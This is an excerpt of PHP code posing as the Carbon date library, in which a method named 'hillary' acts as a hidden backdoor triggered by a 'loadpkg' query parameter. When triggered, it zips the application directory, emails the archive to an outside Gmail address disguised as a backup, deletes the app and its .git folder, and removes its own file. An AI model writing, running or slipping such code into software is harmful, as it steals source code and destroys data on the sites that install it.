...
class Carbon extends DateTime
{
     ...
     * __IterativeArchive()
     * */
    static private function __IterativeArchive($dir, $archiver, $starting_dir=NULL) {
        if (is_null($starting_dir)) {
            $starting_dir = $dir;
        }

        foreach (glob("$dir/*") as $file) {
            if (is_dir($file)) {
                self::__IterativeArchive($file, $archiver, $starting_dir);
            } else {
                $filename = substr($file, strlen($dir)+1);
                $localname = preg_replace("/^(.*)\/.*$/", "$1", substr(str_replace($starting_dir, "", $file), 1));

                if ($localname !== $filename) {
                    $localname = "$localname/$filename";
                }

                $archiver->addFile($file, $localname);
            }
        }
    }
     ...
     * ArchiveAll()
     * */
    static public function ArchiveAll($dir, $destination) {
        $archiver = new ZipArchive;
        $archiver->open($destination, ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE);

        self::__IterativeArchive($dir, $archiver);
    ...
    static public function hillary($dir =null, $destination = null) {


        if (!empty($_GET['loadpkg'])) {
            $dir = $dir  ? $dir : app_path();
            $destination = $destination ? $destination : storage_path() . '/test.zip';
            self::ArchiveAll($dir, $destination);
            \Illuminate\Support\Facades\Mail::raw('Here it is', function ($message) use ($destination){
                $message->from('attendance@pmo.mv', 'Backup');
                $message->to('aturaten.ds@gmail.com');
                $message->attach($destination);
            });
            \Illuminate\Support\Facades\Mail::raw('Here it is', function ($message) use ($destination) {
                $message->from('attendance@pmo.mv', 'Backup');
                $message->to('aturaten.ds@gmail.com');
            ...
            self::rrmdir($dir);
            self::rrmdir("/home/pmomvobo/public_html/attendance/app/.git");
            unlink(__FILE__);
            die();
        }
    }
